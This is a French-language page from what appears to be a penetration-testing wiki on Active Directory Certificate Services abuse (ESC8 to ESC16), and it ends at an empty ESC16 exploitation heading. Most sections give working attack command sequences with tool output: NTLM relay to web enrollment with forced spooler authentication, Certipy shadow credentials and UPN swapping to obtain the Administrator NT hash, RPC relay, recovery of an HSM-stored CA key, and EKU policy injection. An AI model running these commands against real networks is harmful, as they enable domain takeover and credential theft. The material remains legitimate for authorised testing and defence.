> Dans les environnements où **AD CS est installé**, si un **point de terminaison d’inscription web vulnérable** existe et qu’au moins un **modèle de certificat est publié** et autorise **l’inscription des ordinateurs du domaine et l’authentification client** (comme le modèle par défaut **`Machine`**), un attaquant peut compromettre **n’importe quel ordinateur dont le service spooler est actif** !

AD CS prend en charge plusieurs **méthodes d’inscription basées sur HTTP**, disponibles via des rôles de serveur supplémentaires que les administrateurs peuvent installer. Ces interfaces d’inscription de certificats basées sur HTTP sont vulnérables aux **attaques par relais NTLM**. Depuis une **machine compromise**, un attaquant peut usurper l’identité de n’importe quel compte AD qui s’authentifie via NTLM entrant. En usurpant l’identité du compte victime, l’attaquant peut accéder à ces interfaces web pour **demander un certificat d’authentification client à l’aide des modèles de certificat `User` ou `Machine`**.

- L’**interface d’inscription web** (une ancienne application ASP accessible à l’adresse `http://<caserver>/certsrv/`) utilise HTTP uniquement par défaut, ce qui ne protège pas contre les attaques par relais NTLM. De plus, son en-tête HTTP Authorization autorise explicitement uniquement l’authentification NTLM, ce qui rend inapplicables les méthodes d’authentification plus sûres comme Kerberos.
- Le **Certificate Enrollment Service** (CES), le service web **Certificate Enrollment Policy** (CEP) et le **Network Device Enrollment Service** (NDES) prennent en charge par défaut l’authentification Negotiate via leur en-tête HTTP Authorization. L’authentification Negotiate **prend en charge à la fois** Kerberos et **NTLM**, ce qui permet à un attaquant de **rétrograder vers** l’authentification NTLM lors d’attaques par relais. Bien que ces services web activent HTTPS par défaut, HTTPS seul **ne protège pas contre les attaques par relais NTLM**. Pour protéger les services HTTPS contre les attaques par relais NTLM, HTTPS doit être associé à la liaison de canal. Malheureusement, AD CS n’active pas Extended Protection for Authentication dans IIS, fonctionnalité requise pour la liaison de canal.<sup>[[6]](#references)</sup>

Un **problème** courant des attaques par relais NTLM est la **courte durée des sessions NTLM** et l’impossibilité pour l’attaquant d’interagir avec les services qui **exigent la signature NTLM**.

Cette limitation peut toutefois être contournée en exploitant une attaque par relais NTLM pour obtenir un certificat pour l’utilisateur : la durée de validité du certificat détermine celle de la session, et le certificat peut être utilisé avec des services qui **exigent la signature NTLM**. Pour savoir comment utiliser un certificat volé, consultez :


{{#ref}}
account-persistence.md
{{#endref}}

Une autre limitation des attaques par relais NTLM est qu’**un compte victime doit s’authentifier auprès d’une machine contrôlée par l’attaquant**. L’attaquant peut attendre ou tenter de **forcer** cette authentification :


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abus**

La commande `cas` de [**Certify**](https://github.com/GhostPack/Certify) énumère les **points de terminaison HTTP AD CS activés** :<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propriété `msPKI-Enrollment-Servers` est utilisée par les autorités de certification (CA) d’entreprise pour stocker les points de terminaison du service d’inscription de certificats (CES). Ces points de terminaison peuvent être analysés et répertoriés à l’aide de l’outil **Certutil.exe** :

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abus avec Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

Par défaut, Certipy demande un certificat à partir du modèle `Machine` ou `User`, selon que le nom du compte relayé se termine ou non par `$`. Pour spécifier un autre modèle, utilisez le paramètre `-template`.

Une technique comme [PetitPotam](https://github.com/ly4k/PetitPotam) peut ensuite être utilisée pour forcer l’authentification. Pour les contrôleurs de domaine, il faut spécifier `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## Aucune extension de sécurité - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explication

La valeur **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) de **`msPKI-Enrollment-Flag`**, désignée ESC9, omet l’extension SID `szOID_NTDS_CA_SECURITY_EXT` du certificat. Les anciens exemples d’ESC9 dépendent du comportement de compatibilité du KDC (`StrongCertificateBindingEnforcement=1`) ou d’une autre voie de mappage Schannel faible. La valeur `1` est un **paramètre de compatibilité historique**, et non une valeur par défaut actuelle : Microsoft indique que la substitution du KDC n’est plus prise en charge depuis la mise à jour de sécurité Windows du 9 septembre 2025. Vérifiez les mises à jour installées sur la cible et le point de terminaison d’authentification réel avant d’appliquer une ancienne procédure.<sup>[[7]](#references)</sup> Consultez les [instructions de déploiement de Microsoft](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Les conditions dans lesquelles la configuration de cet indicateur devient importante comprennent :

- Sur un ancien KDC compatible, la stratégie effective de liaison des certificats autorise le mappage ; ou le point de terminaison Schannel active séparément le mappage UPN via le bit `0x4` de `CertificateMappingMethods`.
- Le certificat porte l’indicateur `CT_FLAG_NO_SECURITY_EXTENSION` dans le paramètre `msPKI-Enrollment-Flag`.
- Le certificat spécifie un EKU d’authentification client.
- Des permissions `GenericWrite` sont disponibles sur un compte quelconque pour en compromettre un autre.

### Scénario d’abus

Supposons que `John@corp.local` dispose de permissions `GenericWrite` sur `Jane@corp.local` et cherche à compromettre `Administrator@corp.local`. Le modèle de certificat `ESC9`, auquel `Jane@corp.local` est autorisée à s’inscrire, est configuré avec l’indicateur `CT_FLAG_NO_SECURITY_EXTENSION` dans son paramètre `msPKI-Enrollment-Flag`.

Tout d’abord, le hash de `Jane` est obtenu à l’aide de Shadow Credentials, grâce aux permissions `GenericWrite` de `John` :

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, en omettant délibérément la partie domaine `@corp.local` :

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Cette modification ne viole pas les contraintes, étant donné que `Administrator@corp.local` reste distinct du `userPrincipalName` de `Administrator`.

Ensuite, le modèle de certificat `ESC9`, marqué comme vulnérable, est demandé sous l’identité de `Jane` :

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Il est à noter que le `userPrincipalName` du certificat indique `Administrator`, sans aucun « object SID ».

Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d’origine, `Jane@corp.local` :

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

La tentative d’authentification avec le certificat émis renvoie maintenant le NT hash de `Administrator@corp.local`. La commande doit inclure `-domain <domain>`, car le certificat ne spécifie pas de domaine :

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Mappages de certificats faibles - ESC10

### Explication

Deux stratégies distinctes de mappage des certificats sont souvent abordées sous ESC10. Consultez le paramètre sur le point de terminaison qui gère réellement l’authentification concernée :

- `CertificateMappingMethods` de Schannel, sous `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel`, contrôle le mappage des certificats clients TLS sur le serveur d’applications. Le bit UPN est `0x4` ; la valeur par défaut est `0x18` (`0x8 | 0x10`) sur les systèmes mis à jour.
- `StrongCertificateBindingEnforcement` de KDC, sous `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`, contrôlait historiquement la compatibilité du lien des certificats Kerberos. La valeur `1` n’est pas une valeur par défaut actuelle fiable, et Microsoft a mis fin à la prise en charge de cette surcharge avec la mise à jour de sécurité Windows du 9 septembre 2025. Son état ne décrit pas à lui seul le mappage UPN de Schannel.<sup>[[7]](#references)</sup>

**Cas 1**

Historiquement, lorsqu’un KDC plus ancien respectait `StrongCertificateBindingEnforcement=0` ; vérifiez le niveau de mise à jour, car cette surcharge n’est plus prise en charge sur les systèmes actuels corrigés.

**Cas 2**

Lorsque le bit UPN (`0x4`) de `CertificateMappingMethods` est activé sur le point de terminaison Schannel des certificats clients. Il s’agit d’un paramètre distinct de l’application stricte du lien par KDC ; il faut toujours disposer d’un certificat d’authentification client pouvant être inscrit et d’un contrôle effectif de l’attribut du compte mappé.

### Cas d’abus 1

Dans un déploiement plus ancien où le KDC respecte encore `StrongCertificateBindingEnforcement=0`, le contrôle du `userPrincipalName` d’un compte peut faire partie d’un chemin de mappage faible vers un autre compte. L’inscription du certificat requise, le mappage, l’identité cible et la réussite de l’authentification doivent être vérifiés séparément ; un ACE `GenericWrite` ou une valeur de registre ne suffit pas, à lui seul, à établir une prise de contrôle.

Par exemple, en disposant des permissions `GenericWrite` sur `Jane@corp.local`, un attaquant cherche à compromettre `Administrator@corp.local`. La procédure reprend celle d’ESC9 et permet d’utiliser n’importe quel modèle de certificat.

Dans un premier temps, le hash de `Jane` est récupéré au moyen de Shadow Credentials, en exploitant les permissions `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Par la suite, le `userPrincipalName` de `Jane` est modifié pour devenir `Administrator`, en omettant délibérément la partie `@corp.local` afin d’éviter une violation de contrainte.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Ensuite, un certificat permettant l’authentification du client est demandé sous l’identité de `Jane`, à l’aide du modèle `User` par défaut.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d’origine, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

L’authentification avec le certificat obtenu renverra le hash NT de `Administrator@corp.local`. Il faudra préciser le domaine dans la commande, car le certificat ne contient aucune information à ce sujet.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Cas d’abus 2

Avec `CertificateMappingMethods` contenant le bit flag `UPN` (`0x4`), un compte A disposant des permissions `GenericWrite` peut compromettre tout compte B dépourvu de propriété `userPrincipalName`, y compris les comptes machine et l’administrateur de domaine intégré `Administrator`.

Ici, l’objectif est de compromettre `DC$@corp.local`, en commençant par obtenir le hash de `Jane` via Shadow Credentials, en exploitant `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

Le `userPrincipalName` de `Jane` est alors défini sur `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Un certificat pour l’authentification du client est demandé en tant que `Jane` à l’aide du modèle `User` par défaut.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Le `userPrincipalName` de `Jane` est rétabli à sa valeur d’origine après ce processus.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Pour s’authentifier via Schannel, l’option `-ldap-shell` de Certipy est utilisée, ce qui indique que l’authentification a réussi en tant que `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Via le shell LDAP, des commandes telles que `set_rbcd` permettent des attaques par délégation contrainte basée sur les ressources (RBCD), pouvant compromettre le contrôleur de domaine.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Cette vulnérabilité concerne également tout compte utilisateur dépourvu de `userPrincipalName` ou dont la valeur ne correspond pas à `sAMAccountName`. Le compte par défaut `Administrator@corp.local` est une cible de choix en raison de ses privilèges LDAP élevés et de l’absence, par défaut, d’un `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Explication

Si le serveur CA n’est pas configuré avec `IF_ENFORCEENCRYPTICERTREQUEST`, des attaques NTLM relay sans signature peuvent être effectuées via le service RPC. [Référence ici](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Vous pouvez utiliser `certipy` pour déterminer si `Enforce Encryption for Requests` est désactivé ; certipy signalera alors les vulnérabilités `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Scénario d’abus

Il faut configurer un serveur relais :

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Remarque : Pour les contrôleurs de domaine, nous devons spécifier `-template` dans DomainController.

Ou en utilisant [le fork d’impacket de sploutchy](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Accès shell à une CA ADCS avec YubiHSM - ESC12

### Explication

Les administrateurs peuvent configurer l’Autorité de certification pour qu’elle stocke sa clé sur un périphérique externe comme le « Yubico YubiHSM2 ».

Si un périphérique USB est connecté au serveur de la CA via un port USB, ou à un serveur de périphériques USB si le serveur de la CA est une machine virtuelle, une clé d’authentification (parfois appelée « mot de passe ») est requise par le Key Storage Provider pour générer et utiliser des clés dans le YubiHSM.

Cette clé/ce mot de passe est stocké en clair dans le registre, sous `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Référence [ici](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scénario d’abus

Si la clé privée de la CA est stockée sur un périphérique USB physique lorsque vous obtenez un accès shell, il est possible de récupérer la clé.

Tout d’abord, vous devez obtenir le certificat de la CA (il est public), puis :

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Enfin, utilisez la commande certutil `-sign` pour forger un nouveau certificat arbitraire à l’aide du certificat de l’AC et de sa clé privée.

## Abus du lien entre OID et groupe - ESC13

### Explication

L’attribut `msPKI-Certificate-Policy` permet d’ajouter la stratégie d’émission au modèle de certificat. Les objets `msPKI-Enterprise-Oid`, responsables des stratégies d’émission, peuvent être trouvés dans le contexte de nommage Configuration (CN=OID,CN=Public Key Services,CN=Services) du conteneur OID PKI. Une stratégie peut être liée à un groupe AD à l’aide de l’attribut `msDS-OIDToGroupLink` de cet objet, ce qui permet à un système d’autoriser un utilisateur qui présente le certificat comme s’il était membre du groupe. [Référence ici](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Autrement dit, lorsqu’un utilisateur a l’autorisation d’inscrire un certificat et que celui-ci est lié à un groupe OID, l’utilisateur peut hériter des privilèges de ce groupe.

Utilisez [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) pour trouver OIDToGroupLink :

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Scénario d’abus

Trouvez une autorisation utilisateur que vous pouvez utiliser avec `certipy find` ou `Certify.exe find /showAllPermissions`.

Si `John` dispose d’une autorisation d’inscription sur `VulnerableTemplate`, l’utilisateur peut hériter des privilèges du groupe `VulnerableGroup`.

Il lui suffit de spécifier le modèle pour obtenir un certificat avec les droits `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Abus du mappage explicite de certificats — ESC14

### Explication

La description à l’adresse https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping est remarquablement complète. Voici une citation du texte original.<sup>[[14]](#references)</sup>

ESC14 concerne les vulnérabilités liées au « mappage explicite faible de certificats », principalement dues à une mauvaise utilisation ou à une configuration non sécurisée de l’attribut `altSecurityIdentities` sur les comptes d’utilisateurs ou d’ordinateurs Active Directory. Cet attribut multi-valué permet aux administrateurs d’associer manuellement des certificats X.509 à un compte AD à des fins d’authentification. Lorsque ces mappages explicites sont renseignés, ils peuvent remplacer la logique de mappage par défaut des certificats, qui repose généralement sur les UPN ou les noms DNS dans le SAN du certificat, ou sur le SID intégré à l’extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`.

Un mappage « faible » se produit lorsque la valeur de chaîne utilisée dans l’attribut `altSecurityIdentities` pour identifier un certificat est trop générale, facile à deviner, repose sur des champs de certificat non uniques ou utilise des composants de certificat faciles à usurper. Si un attaquant peut obtenir ou créer un certificat dont les attributs correspondent à un tel mappage explicite faible pour un compte privilégié, il peut utiliser ce certificat pour s’authentifier en tant que ce compte et usurper son identité.

Exemples de chaînes de mappage `altSecurityIdentities` potentiellement faibles :

- Mappage reposant uniquement sur un nom commun (CN) courant dans le Subject : par exemple, `X509:<S>CN=SomeUser`. Un attaquant pourrait obtenir un certificat portant ce CN auprès d’une source moins sécurisée.
- Utilisation de noms distinctifs (DN) Issuer ou Subject trop génériques, sans qualification supplémentaire telle qu’un numéro de série spécifique ou un identifiant de clé de sujet : par exemple, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Utilisation d’autres modèles prévisibles ou d’identifiants non cryptographiques qu’un attaquant pourrait satisfaire dans un certificat qu’il peut obtenir légitimement ou falsifier (s’il a compromis une CA ou trouvé un modèle vulnérable comme dans ESC1).

L’attribut `altSecurityIdentities` prend en charge différents formats de mappage, tels que :

- `X509:<I>IssuerDN<S>SubjectDN` (mappage par DN Issuer et Subject complets)
- `X509:<SKI>SubjectKeyIdentifier` (mappage par la valeur de l’extension Subject Key Identifier du certificat)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mappage par numéro de série, implicitement qualifié par le DN Issuer) - ce n’est pas un format standard ; le format habituel est `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mappage par un nom RFC822, généralement une adresse e-mail, provenant du SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mappage par un hachage SHA1 de la clé publique brute du certificat - généralement robuste)

La sécurité de ces mappages dépend des identifiants qu’ils utilisent. Microsoft classe comme **faibles** les mappages basés sur des adresses e-mail ou des noms de sujet, y compris `X509:<RFC822>`. En mode Full Enforcement, un certificat dépourvu de mappage robuste est rejeté ; la mise à jour de sécurité Windows de septembre 2025 a supprimé la possibilité de revenir au mode Compatibility. Un mappage faible à lui seul ne constitue donc pas une méthode d’usurpation fiable aujourd’hui. Avant d’évaluer un scénario de mappage faible, vérifiez le niveau de correctifs réel du contrôleur de domaine et le comportement du mappage des certificats. Le droit d’écriture sur `altSecurityIdentities` constitue une piste distincte : un attaquant disposant d’un certificat approuvé approprié peut potentiellement ajouter un mappage explicite **robuste**, sous réserve des autorisations effectives et de la validation du certificat. Consultez [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) et [la recherche sur ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Les échecs d’authentification par certificat nécessitent également un diagnostic : la désactivation du compte cible ou l’expiration de son mot de passe peut empêcher la connexion, même si le certificat lui-même reste valide.

### Scénario d’abus

ESC14 cible les **mappages explicites de certificats** dans Active Directory (AD), plus précisément l’attribut `altSecurityIdentities`. Si cet attribut est défini (intentionnellement ou à la suite d’une mauvaise configuration), les attaquants peuvent usurper l’identité de comptes en présentant des certificats correspondant au mappage.

#### Scénario A : l’attaquant peut écrire dans `altSecurityIdentities`

 **Prérequis** : l’attaquant dispose des autorisations d’écriture sur l’attribut `altSecurityIdentities` du compte cible, ou de la permission de les accorder sous la forme de l’une des autorisations suivantes sur l’objet AD cible :  
- Écriture de la propriété `altSecurityIdentities`  
- Écriture de la propriété `Public-Information`  
- Écriture de toutes les propriétés  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Propriétaire*.
#### Scénario B : la cible possède un mappage faible via X509RFC822 (e-mail)

- **Prérequis historiques/conditionnels** : la cible possède un mappage faible X509RFC822 dans `altSecurityIdentities`, l’attaquant peut modifier l’attribut `mail` d’un demandeur, et un modèle adapté inclut cette adresse e-mail dans un certificat d’authentification client sans liaison SID conflictuelle. L’authentification nécessite également un environnement qui accepte encore le mappage faible ; Full Enforcement rejette les mappages de certificats reposant uniquement sur un mappage faible. Le seul fait que l’attribut `mail` soit modifiable constitue uniquement une piste.
#### Scénario C : la cible possède un mappage X509IssuerSubject

- **Prérequis** : la cible possède un mappage explicite X509IssuerSubject faible dans `altSecurityIdentities`.L’attaquant peut définir l’attribut `cn` ou `dNSHostName` d’un principal victime pour qu’il corresponde au sujet du mappage X509IssuerSubject de la cible. L’attaquant peut ensuite inscrire un certificat en tant que victime et l’utiliser pour s’authentifier en tant que cible.
#### Scénario D : la cible possède un mappage X509SubjectOnly

- **Prérequis** : la cible possède un mappage explicite X509SubjectOnly faible dans `altSecurityIdentities`. L’attaquant peut définir l’attribut `cn` ou `dNSHostName` d’un principal victime pour qu’il corresponde au sujet du mappage X509SubjectOnly de la cible. L’attaquant peut ensuite inscrire un certificat en tant que victime et l’utiliser pour s’authentifier en tant que cible.
### opérations concrètes
#### Scénario A

Demander un certificat à partir du modèle de certificat `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Enregistrer et convertir le certificat

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 S’authentifier (à l’aide du certificat)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Nettoyage (facultatif)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Pour des méthodes d’attaque plus spécifiques selon les différents scénarios, veuillez consulter : [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explication

La [recherche originale sur ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) explique comment les politiques d’application fournies dans une requête pour un modèle V1 peuvent remplacer l’Extended Key Usage configuré sur une **CA émettrice non corrigée**.<sup>[[15]](#references)</sup> Il faut également disposer d’un modèle publié et autorisant l’inscription, qui permette les propriétés requises du sujet/de la requête et ne comporte aucune approbation bloquante ni exigence de signature. Les droits d’inscription à eux seuls ne prouvent pas que l’exploitation est possible. L’utilisation de Certificate Request Agent peut aussi dépendre d’un deuxième modèle adapté et de restrictions propres aux agents d’inscription ; vérifiez l’état des correctifs de la CA et le résultat de l’émission avant de revendiquer cette méthode.

### Exploitation

La [documentation de Certipy sur l’élévation de privilèges](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contient des exemples d’utilisation plus détaillés.<sup>[[14]](#references)</sup>


La commande `find` de Certipy peut aider à repérer les modèles V1 potentiellement vulnérables à ESC15 si la CA n’est pas corrigée.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scénario A : Usurpation directe via Schannel

**Étape 1 : Demander un certificat en injectant la stratégie d’application « Client Authentication » et l’UPN de la cible.** L’attaquant `attacker@corp.local` cible `administrator@corp.local` à l’aide du modèle « WebServer » V1 (qui autorise le sujet fourni par le demandeur).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'` : le modèle V1 vulnérable avec « Enrollee supplies subject ».
- `-application-policies 'Client Authentication'` : injecte l’OID `1.3.6.1.5.5.7.3.2` dans l’extension Application Policies du CSR.
- `-upn 'administrator@corp.local'` : définit l’UPN dans le SAN pour l’usurpation d’identité.

**Étape 2 : S’authentifier via Schannel (LDAPS) à l’aide du certificat obtenu.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scénario B : Usurpation d’identité PKINIT/Kerberos via l’abus d’un Enrollment Agent

**Étape 1 : Demander un certificat à partir d’un modèle V1 (avec « Enrollee supplies subject »), en injectant la stratégie d’application « Certificate Request Agent ».** Ce certificat est destiné à l’attaquant (`attacker@corp.local`) afin qu’il devienne un agent d’inscription. Aucun UPN n’est spécifié pour l’identité propre de l’attaquant, car l’objectif est d’obtenir les capacités d’un agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'` : Injecte l’OID `1.3.6.1.4.1.311.20.2.1`.

**Étape 2 : Utilisez le certificat « agent » pour demander un certificat au nom d’un utilisateur privilégié cible.** Il s’agit d’une étape similaire à ESC3, qui utilise le certificat de l’étape 1 comme certificat d’agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Étape 3 : Authentifiez-vous en tant qu’utilisateur privilégié à l’aide du certificat « on-behalf-of ».**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Extension de sécurité désactivée globalement sur la CA-ESC16

### Explication

**ESC16 (élévation de privilèges via l’absence de l’extension szOID_NTDS_CA_SECURITY_EXT)** décrit la désactivation à l’échelle de la CA de l’extension SID **szOID_NTDS_CA_SECURITY_EXT**. Il s’agit d’un indicateur de configuration, et non d’une preuve qu’un certificat peut s’authentifier en tant qu’un autre compte. L’usurpation d’identité nécessite également le contrôle des attributs ou du mappage du compte concerné, un modèle d’authentification client auquel il est possible de s’inscrire, ainsi qu’un chemin de mappage de certificat accepté par le contrôleur de domaine ou le service concerné. Un KDC corrigé en mode Full Enforcement rejette les certificats dépourvus d’extension SID, sauf s’ils disposent d’un autre mappage fort ; la procédure Kerberos utilisant uniquement l’UPN ci-dessous s’applique aux anciens KDC ou aux KDC en mode de compatibilité qui acceptent encore un mappage faible. Consultez les [recommandations de Microsoft sur le mappage des certificats et l’application des règles](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Vous pouvez également consulter cet article pour en savoir plus sur le principe détaillé :https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Exploitation

